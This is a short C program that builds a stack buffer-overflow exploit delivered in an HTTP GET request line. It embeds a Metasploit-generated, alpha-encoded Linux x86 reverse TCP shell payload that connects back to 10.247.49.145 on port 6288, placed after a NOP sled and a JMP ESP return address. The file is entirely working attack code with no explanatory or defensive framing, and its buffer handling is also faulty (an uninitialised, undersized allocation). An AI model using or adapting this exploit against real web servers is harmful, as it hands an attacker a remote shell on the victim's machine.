#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * linux/x86/shell_reverse_tcp - 198 bytes
 * http://www.metasploit.com
 * Encoder: x86/alpha_mixed
 * VERBOSE=false, LHOST=10.247.49.145, LPORT=6288,
 * ReverseAllowProxy=false, ReverseConnectRetries=5,
 * ReverseListenerThreaded=false, PrependFork=false,
 * PrependSetresuid=false, PrependSetreuid=false,
 * PrependSetuid=false, PrependSetresgid=false,
 * PrependSetregid=false, PrependSetgid=false,
 * PrependChrootBreak=false, AppendExit=false,
 * InitialAutoRunScript=, AutoRunScript=, CMD=/bin/sh
 */
unsigned char buf[] =
"\x89\xe5\xd9\xe9\xd9\x75\xf4\x5d\x55\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x36\x51\x4b\x6b\x78\x77\x6a\x43\x51\x43\x51\x53\x52\x73\x70"
"\x6a\x67\x72\x6e\x69\x6d\x31\x6c\x70\x71\x76\x58\x4d\x6f\x70"
"\x5a\x33\x76\x39\x48\x30\x65\x6f\x38\x4d\x6b\x30\x37\x39\x42"
"\x59\x79\x69\x53\x58\x55\x5a\x5a\x57\x44\x71\x4f\x61\x62\x48"
"\x37\x72\x35\x50\x45\x48\x6a\x30\x6e\x69\x58\x61\x6e\x50\x52"
"\x46\x70\x50\x63\x61\x76\x33\x6d\x63\x45\x53\x4d\x59\x68\x61"
"\x68\x4d\x4f\x70\x36\x32\x70\x68\x70\x6e\x36\x4f\x63\x43\x72"
"\x48\x65\x38\x56\x4f\x56\x4f\x55\x32\x70\x69\x6c\x49\x49\x73"
"\x76\x32\x46\x33\x4f\x79\x78\x61\x6e\x50\x34\x4b\x6a\x6d\x6b"
"\x30\x41\x41";

#define NOP "\x90"
#define JMP_ESP "\xa7\x2b\x12\x42"

int main(int argc, char** argv)
{
	char *payload = malloc(2000);
	int i;

	for ( i = 0; i < 1032; i++)
	{
		strcat(payload, NOP);
	}

	strcat(payload, JMP_ESP);

	for ( i = 0; i < 500; i++)
	{
		strcat(payload, NOP);
	}

	strcat(payload, buf);

	printf("%s%s %s", "GET /", payload, " HTTP/1.1");
}
